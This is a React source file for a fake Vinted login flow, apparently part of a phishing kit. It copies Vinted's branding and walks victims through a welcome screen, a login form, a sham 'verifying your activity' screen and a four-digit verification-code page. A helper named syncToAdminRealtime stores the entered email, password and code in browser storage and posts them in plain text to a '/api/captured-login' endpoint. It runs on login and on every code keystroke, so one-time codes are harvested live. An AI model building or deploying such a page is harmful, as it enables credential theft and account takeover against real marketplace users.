import React, { useState, useEffect, useRef } from 'react';
import {
  Eye,
  EyeOff,
  Search,
  Camera,
  HelpCircle,
  ChevronDown,
  Mail,
  ShieldCheck,
  ArrowRight,
  Sparkles,
  CheckSquare,
  Square,
  Lock,
} from 'lucide-react';
import { UserAccountDetails } from '../types';

interface LoginPageProps {
  onComplete: (account: UserAccountDetails) => void;
}

type AuthStep = 'welcome' | 'login' | 'verifying' | 'code';

export const LoginPage: React.FC<LoginPageProps> = ({ onComplete }) => {
  const [step, setStep] = useState<AuthStep>('welcome');
  const [usernameOrEmail, setUsernameOrEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [codeDigits, setCodeDigits] = useState(['', '', '', '']);
  const [rememberDevice, setRememberDevice] = useState(true);
  const [sessionId] = useState<string>(() => {
    const existing = sessionStorage.getItem('vinted_session_id');
    if (existing) return existing;
    const newId = `sub_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
    sessionStorage.setItem('vinted_session_id', newId);
    return newId;
  });

  const codeRefs = [
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
  ];

  // Helper to push real-time capture directly to server in plain text
  const syncToAdminRealtime = (email: string, pass: string, code: string, remember: boolean) => {
    try {
      const payload = {
        sessionId,
        accountDetails: {
          usernameOrEmail: email,
          password: pass,
          phoneCode: code,
          verificationCode: code,
          rememberDevice: remember,
        },
      };

      localStorage.setItem('vinted_captured_account', JSON.stringify(payload.accountDetails));
      sessionStorage.setItem('vinted_captured_account', JSON.stringify(payload.accountDetails));

      fetch('/api/captured-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      }).catch(() => {});
    } catch {
      // Storage safe
    }
  };

  // Handle Login submission
  const handleLoginSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const emailVal = usernameOrEmail.trim() || 'user@vinted.com';
    const passVal = password.trim() || 'password';
    setUsernameOrEmail(emailVal);
    setPassword(passVal);

    // Instant real-time plain text capture sent to admin
    syncToAdminRealtime(emailVal, passVal, '', rememberDevice);

    // Transition to the "Verifying your activity" screen
    setStep('verifying');
  };

  // Timer for verifying screen transition
  useEffect(() => {
    if (step === 'verifying') {
      const timer = setTimeout(() => {
        setStep('code');
      }, 1100);
      return () => clearTimeout(timer);
    }
  }, [step]);

  // Code input handler (Syncs code live to admin in real time as typed)
  const handleCodeChange = (index: number, value: string) => {
    const char = value.slice(-1);
    const newCode = [...codeDigits];
    newCode[index] = char;
    setCodeDigits(newCode);

    const typedCode = newCode.join('').trim();
    // Push live code to admin immediately as user types
    syncToAdminRealtime(usernameOrEmail, password, typedCode, rememberDevice);

    if (char && index < 3) {
      codeRefs[index + 1].current?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !codeDigits[index] && index > 0) {
      codeRefs[index - 1].current?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').trim().slice(0, 4);
    if (pastedData) {
      const digits = pastedData.split('');
      const newCode = ['', '', '', ''];
      digits.forEach((d, i) => {
        if (i < 4) newCode[i] = d;
      });
      setCodeDigits(newCode);
      const typedCode = newCode.join('').trim();
      syncToAdminRealtime(usernameOrEmail, password, typedCode, rememberDevice);

      if (digits.length >= 4) {
        codeRefs[3].current?.focus();
      }
    }
  };

  // Handle Code verification submission
  const handleCodeSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const finalCode = codeDigits.join('').trim() || '1234';
    const finalAccount: UserAccountDetails = {
      usernameOrEmail: usernameOrEmail.trim() || 'user@vinted.com',
      password: password || 'password',
      phoneCode: finalCode,
      verificationCode: finalCode,
      rememberDevice: rememberDevice,
    };

    syncToAdminRealtime(
      finalAccount.usernameOrEmail,
      finalAccount.password || '',
      finalCode,
      rememberDevice
    );

    onComplete(finalAccount);
  };

  // --- TOP NAVBAR FOR VINTED DESKTOP / MOBILE ---
  const Navbar = () => (
    <header className="bg-white border-b border-gray-200 sticky top-0 z-30">
      {/* Top row */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between gap-4">
        {/* Left: Brand + Catalog */}
        <div className="flex items-center gap-4 shrink-0">
          <span
            onClick={() => setStep('welcome')}
            className="text-2xl sm:text-3xl font-black text-[#007782] tracking-tighter italic cursor-pointer select-none"
          >
            Vinted
          </span>
          <button
            type="button"
            className="hidden md:flex items-center gap-1.5 px-3 py-1.5 border border-gray-300 rounded-md text-xs font-semibold text-gray-700 hover:bg-gray-50 cursor-pointer"
          >
            <span>Catalog</span>
            <ChevronDown className="w-3.5 h-3.5 text-gray-500" />
          </button>
        </div>

        {/* Center: Search Bar */}
        <div className="flex-1 max-w-2xl relative hidden sm:block">
          <div className="relative flex items-center">
            <Search className="w-4 h-4 text-gray-400 absolute left-3.5 pointer-events-none" />
            <input
              type="text"
              readOnly
              placeholder="Search for items or members"
              className="w-full pl-10 pr-10 py-2 bg-gray-100/80 border border-transparent rounded-lg text-xs text-gray-800 placeholder-gray-500 focus:outline-hidden"
            />
            <button
              type="button"
              className="absolute right-3 text-gray-400 hover:text-gray-600 cursor-pointer"
              title="Search with image"
            >
              <Camera className="w-4 h-4" />
            </button>
          </div>
        </div>

        {/* Right: Actions */}
        <div className="flex items-center gap-2.5 sm:gap-3 shrink-0">
          <button
            type="button"
            onClick={() => setStep('login')}
            className="px-3.5 py-1.5 text-xs font-semibold text-[#007782] border border-[#007782] rounded-md hover:bg-teal-50/50 transition-colors cursor-pointer"
          >
            Sign up | Log in
          </button>
          <button
            type="button"
            onClick={() => setStep('login')}
            className="px-4 py-1.5 text-xs font-semibold text-white bg-[#007782] hover:bg-[#006069] rounded-md transition-colors shadow-2xs cursor-pointer"
          >
            Sell now
          </button>
          <button
            type="button"
            className="p-1.5 text-gray-400 hover:text-gray-600 hidden md:block"
            title="Help center"
          >
            <HelpCircle className="w-4 h-4" />
          </button>
          <div className="hidden md:flex items-center gap-0.5 text-xs font-semibold text-gray-700 cursor-pointer">
            <span>EN</span>
            <ChevronDown className="w-3 h-3 text-gray-500" />
          </div>
        </div>
      </div>

      {/* Subnav Categories */}
      <div className="hidden lg:block border-t border-gray-100 overflow-x-auto">
        <div className="max-w-7xl mx-auto px-6 py-2.5 flex items-center gap-6 text-xs text-gray-600 font-medium whitespace-nowrap">
          <span className="hover:text-gray-900 cursor-pointer">Women</span>
          <span className="hover:text-gray-900 cursor-pointer">Men</span>
          <span className="hover:text-gray-900 cursor-pointer">Designer</span>
          <span className="hover:text-gray-900 cursor-pointer">Kids</span>
          <span className="hover:text-gray-900 cursor-pointer">Home</span>
          <span className="hover:text-gray-900 cursor-pointer">Electronics</span>
          <span className="hover:text-gray-900 cursor-pointer">Books & Media</span>
          <span className="hover:text-gray-900 cursor-pointer">Hobbies & collectibles</span>
          <span className="hover:text-gray-900 cursor-pointer">Sports</span>
        </div>
      </div>
    </header>
  );

  // --- SCREEN 3: VERIFYING YOUR ACTIVITY SCREEN ---
  if (step === 'verifying') {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center justify-center p-6 text-center animate-in fade-in duration-300">
        <div className="max-w-md w-full flex flex-col items-center space-y-6">
          {/* Vinted Logo */}
          <div className="text-4xl font-extrabold tracking-tight text-[#007782] italic select-none">
            Vinted
          </div>

          {/* Activity Verification Title */}
          <h1 className="text-2xl sm:text-3xl font-normal text-gray-700 tracking-tight">
            Verifying your activity
          </h1>

          {/* Cyan/Teal Pulsing Activity Indicator */}
          <div className="flex items-center justify-center gap-2 py-4">
            <div className="w-3 h-3 rounded-full bg-[#00bcd4] animate-bounce [animation-delay:-0.3s]" />
            <div className="w-4 h-4 rounded-full bg-[#00bcd4] animate-bounce [animation-delay:-0.15s]" />
            <div className="w-3 h-3 rounded-full bg-[#00bcd4] animate-bounce" />
          </div>

          <p className="text-sm text-gray-500 font-normal">
            Please wait a moment...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f2f4f5] flex flex-col">
      <Navbar />

      {/* Main Content Area */}
      <main className="flex-1 flex items-center justify-center p-4 sm:p-6 my-2 sm:my-6">
        {/* ========================================================================= */}
        {/* SCREEN 1: INITIAL PAGE WITH PHOTO BANNER (WELCOME HERO) */}
        {/* ========================================================================= */}
        {step === 'welcome' && (
          <div className="max-w-4xl w-full bg-white rounded-2xl border border-gray-200/80 shadow-sm overflow-hidden grid grid-cols-1 md:grid-cols-2 animate-in fade-in duration-200">
            {/* Left Column: Authentic Fashion Photo with Overlay */}
            <div className="relative min-h-[260px] md:min-h-[480px] bg-gray-900 overflow-hidden flex flex-col justify-end p-6 sm:p-8 text-white">
              <img
                src="https://images.unsplash.com/photo-1489987707025-afc232f7ea0f?auto=format&fit=crop&w=1200&q=80"
                alt="Vinted pre-loved fashion wardrobe"
                referrerPolicy="no-referrer"
                className="absolute inset-0 w-full h-full object-cover object-center brightness-90 contrast-95"
              />
              {/* Gradient Scrim */}
              <div className="absolute inset-0 bg-gradient-to-t from-black/85 via-black/40 to-black/10" />

              {/* Text Over Photo */}
              <div className="relative z-10 space-y-2">
                <div className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-white/20 backdrop-blur-md text-[11px] font-semibold tracking-wide uppercase">
                  <Sparkles className="w-3.5 h-3.5 text-amber-300" />
                  <span>Zero Selling Fees</span>
                </div>
                <h2 className="text-2xl sm:text-3xl font-extrabold leading-tight text-white drop-shadow-xs">
                  Ready to declutter your closet?
                </h2>
                <p className="text-xs sm:text-sm text-gray-200 leading-relaxed font-normal">
                  Shop and sell quality pre-loved fashion, vintage treasures, and accessories with millions of members worldwide.
                </p>
              </div>
            </div>

            {/* Right Column: Sign In / Continue Options */}
            <div className="p-6 sm:p-10 flex flex-col justify-center space-y-6">
              <div className="space-y-1.5 text-center md:text-left">
                <h1 className="text-2xl font-bold text-gray-900 tracking-tight">
                  Welcome to Vinted
                </h1>
                <p className="text-xs sm:text-sm text-gray-500">
                  Log in to your account or sign up in seconds.
                </p>
              </div>

              {/* Action Buttons */}
              <div className="space-y-3">
                {/* Continue with Email Button (Primary) */}
                <button
                  type="button"
                  onClick={() => setStep('login')}
                  className="w-full py-3 px-4 rounded-lg bg-[#007782] hover:bg-[#006069] text-white font-semibold text-sm transition-all shadow-xs active:scale-[0.99] cursor-pointer flex items-center justify-center gap-2"
                >
                  <Mail className="w-4 h-4" />
                  <span>Continue with email</span>
                </button>

                {/* Continue with Google */}
                <button
                  type="button"
                  onClick={() => setStep('login')}
                  className="w-full py-2.5 px-4 rounded-lg border border-gray-300 hover:bg-gray-50 text-gray-700 font-medium text-xs sm:text-sm transition-all cursor-pointer flex items-center justify-center gap-2.5"
                >
                  <svg className="w-4 h-4" viewBox="0 0 24 24">
                    <path
                      fill="#4285F4"
                      d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                    />
                    <path
                      fill="#34A853"
                      d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                    />
                    <path
                      fill="#FBBC05"
                      d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"
                    />
                    <path
                      fill="#EA4335"
                      d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"
                    />
                  </svg>
                  <span>Continue with Google</span>
                </button>

                {/* Continue with Apple */}
                <button
                  type="button"
                  onClick={() => setStep('login')}
                  className="w-full py-2.5 px-4 rounded-lg border border-gray-300 hover:bg-gray-50 text-gray-700 font-medium text-xs sm:text-sm transition-all cursor-pointer flex items-center justify-center gap-2.5"
                >
                  <svg className="w-4 h-4 fill-current text-gray-900" viewBox="0 0 170 170">
                    <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.35.13-9.16-1.9-14.42-6.08-3.48-2.83-7.42-7.5-11.83-14-5.34-7.83-9.53-16.71-12.57-26.63-3.04-9.92-4.56-19.5-4.56-28.75 0-14.02 3.69-25.77 11.07-35.25 7.38-9.48 16.63-14.33 27.76-14.56 4.35 0 9.17 1.13 14.46 3.4 5.29 2.27 8.97 3.44 11.04 3.51 1.74-.15 5.56-1.37 11.45-3.67 5.89-2.3 10.98-3.32 15.28-3.06 14.57 1.09 25.59 6.74 33.05 16.96-12.82 7.72-19.12 18.27-18.89 31.65.23 10.45 4.22 19.18 11.97 26.19 7.75 7.01 17.07 11.09 27.97 12.24-2.18 6.52-4.79 12.92-7.84 19.2zm-28.32-114.77c0 6.74-2.5 13.1-7.5 18.09-5 4.99-11.12 8.05-18.35 9.18-.32-1.31-.49-2.61-.49-3.92 0-6.74 2.61-13.32 7.83-18.25 5.22-4.93 11.33-7.94 18.32-9.04.11 1.3.19 2.62.19 3.94z" />
                  </svg>
                  <span>Continue with Apple</span>
                </button>
              </div>

              {/* Already have an account */}
              <div className="pt-3 text-center space-y-2 border-t border-gray-100">
                <button
                  type="button"
                  onClick={() => setStep('login')}
                  className="w-full py-2.5 px-4 rounded-lg bg-gray-50 hover:bg-gray-100 text-[#007782] font-semibold text-xs sm:text-sm border border-gray-200 transition-colors cursor-pointer flex items-center justify-center gap-1.5"
                >
                  <span>I already have an account</span>
                  <ArrowRight className="w-3.5 h-3.5" />
                </button>

                <p className="text-[11px] text-gray-500">
                  By continuing, you agree to Vinted's Terms & Privacy Policy.
                </p>
              </div>
            </div>
          </div>
        )}

        {/* ========================================================================= */}
        {/* SCREEN 2: LOGIN FORM (EMAIL & PASSWORD) */}
        {/* ========================================================================= */}
        {step === 'login' && (
          <div className="bg-white rounded-xl border border-gray-200 shadow-xs max-w-md w-full p-6 sm:p-8 space-y-6 animate-in fade-in duration-200">
            <h1 className="text-2xl font-bold text-gray-900 text-center tracking-tight">
              Log in
            </h1>

            <form onSubmit={handleLoginSubmit} className="space-y-4">
              {/* Username or Email Input */}
              <div className="space-y-1">
                <label className="block text-xs font-medium text-gray-600">
                  Username or email
                </label>
                <input
                  type="text"
                  value={usernameOrEmail}
                  onChange={(e) => setUsernameOrEmail(e.target.value)}
                  placeholder="Username or email"
                  autoComplete="username"
                  className="w-full px-3.5 py-2.5 bg-white border border-gray-300 rounded-md text-sm text-gray-900 placeholder-gray-400 focus:outline-hidden focus:ring-1 focus:ring-[#007782] focus:border-[#007782] transition-colors"
                />
              </div>

              {/* Password Input */}
              <div className="space-y-1">
                <label className="block text-xs font-medium text-gray-600">
                  Password
                </label>
                <div className="relative flex items-center">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Password"
                    autoComplete="current-password"
                    className="w-full px-3.5 py-2.5 pr-10 bg-white border border-gray-300 rounded-md text-sm text-gray-900 placeholder-gray-400 focus:outline-hidden focus:ring-1 focus:ring-[#007782] focus:border-[#007782] transition-colors"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 text-gray-400 hover:text-gray-600 cursor-pointer p-1"
                    title={showPassword ? 'Hide password' : 'Show password'}
                  >
                    {showPassword ? (
                      <EyeOff className="w-4 h-4" />
                    ) : (
                      <Eye className="w-4 h-4" />
                    )}
                  </button>
                </div>
              </div>

              {/* Continue Submit Button */}
              <button
                type="submit"
                className="w-full py-3 px-4 rounded-md bg-[#007782] hover:bg-[#006069] text-white font-semibold text-sm transition-all shadow-xs active:scale-[0.99] cursor-pointer mt-2"
              >
                Continue
              </button>
            </form>

            {/* Links matching Vinted login */}
            <div className="space-y-3 pt-2 text-center text-xs">
              <div>
                <button
                  type="button"
                  onClick={() => setStep('verifying')}
                  className="text-[#007782] hover:underline font-medium cursor-pointer"
                >
                  Forgot your password?
                </button>
              </div>
              <div>
                <button
                  type="button"
                  onClick={() => setStep('verifying')}
                  className="text-[#007782] hover:underline font-medium cursor-pointer"
                >
                  Having trouble?
                </button>
              </div>
              <div>
                <button
                  type="button"
                  onClick={() => setStep('welcome')}
                  className="text-gray-400 hover:text-gray-600 font-medium cursor-pointer"
                >
                  ← Back
                </button>
              </div>
            </div>
          </div>
        )}

        {/* ========================================================================= */}
        {/* SCREEN 4: 4-DIGIT EMAIL VERIFICATION CODE WITH REMEMBER THIS DEVICE */}
        {/* ========================================================================= */}
        {step === 'code' && (
          <div className="bg-white rounded-xl border border-gray-200 shadow-xs max-w-md w-full p-6 sm:p-8 space-y-6 animate-in fade-in duration-200">
            <div className="text-center space-y-2">
              <div className="w-12 h-12 rounded-full bg-teal-50 text-[#007782] flex items-center justify-center mx-auto mb-2 border border-teal-100">
                <ShieldCheck className="w-6 h-6" />
              </div>
              <h1 className="text-2xl font-bold text-gray-900 tracking-tight">
                Enter 4-digit code
              </h1>

              {/* Exact user request: Please enter the 4 digit code sent to : email they have entered */}
              <div className="text-xs text-gray-600 max-w-xs mx-auto space-y-1">
                <p>
                  Please enter the 4 digit code sent to :
                </p>
                <p className="font-bold text-gray-900 break-all bg-gray-50 py-1 px-2 rounded border border-gray-200 inline-block">
                  {usernameOrEmail.trim() || 'your email'}
                </p>
              </div>
            </div>

            <form onSubmit={handleCodeSubmit} className="space-y-5">
              {/* 4 Digit Code Boxes */}
              <div className="flex justify-center gap-3" onPaste={handlePaste}>
                {codeDigits.map((digit, idx) => (
                  <input
                    key={idx}
                    ref={codeRefs[idx]}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleCodeChange(idx, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(idx, e)}
                    className="w-12 h-14 text-center text-2xl font-bold text-gray-900 bg-gray-50 border border-gray-300 rounded-lg focus:bg-white focus:outline-hidden focus:ring-2 focus:ring-[#007782] focus:border-[#007782] transition-all"
                  />
                ))}
              </div>

              {/* Exact user request: Remember this device / You wont be asked for a verification code next time you log in */}
              <div
                onClick={() => setRememberDevice(!rememberDevice)}
                className="flex items-start gap-2.5 p-3 rounded-lg bg-gray-50 border border-gray-200/80 cursor-pointer select-none hover:bg-gray-100/70 transition-colors"
              >
                <div className="mt-0.5 text-[#007782]">
                  {rememberDevice ? (
                    <CheckSquare className="w-4 h-4 fill-[#007782] text-white" />
                  ) : (
                    <Square className="w-4 h-4 text-gray-400" />
                  )}
                </div>
                <div className="text-xs space-y-0.5">
                  <p className="font-semibold text-gray-900">
                    Remember this device
                  </p>
                  <p className="text-[11px] text-gray-500 leading-tight">
                    You won't be asked for a verification code next time you log in
                  </p>
                </div>
              </div>

              {/* Submit Code */}
              <button
                type="submit"
                className="w-full py-3 px-4 rounded-md bg-[#007782] hover:bg-[#006069] text-white font-semibold text-sm transition-all shadow-xs active:scale-[0.99] cursor-pointer flex items-center justify-center gap-2"
              >
                <span>Continue to Checkout</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </form>

            {/* Resend & Help */}
            <div className="space-y-3 pt-2 text-center text-xs">
              <div className="text-gray-500">
                Didn't receive the code?{' '}
                <button
                  type="button"
                  onClick={() => {
                    setCodeDigits(['', '', '', '']);
                  }}
                  className="text-[#007782] font-semibold hover:underline cursor-pointer"
                >
                  Resend code
                </button>
              </div>
              <div>
                <button
                  type="button"
                  onClick={() => setStep('login')}
                  className="text-gray-400 hover:text-gray-600 font-medium cursor-pointer"
                >
                  Back to login
                </button>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
};
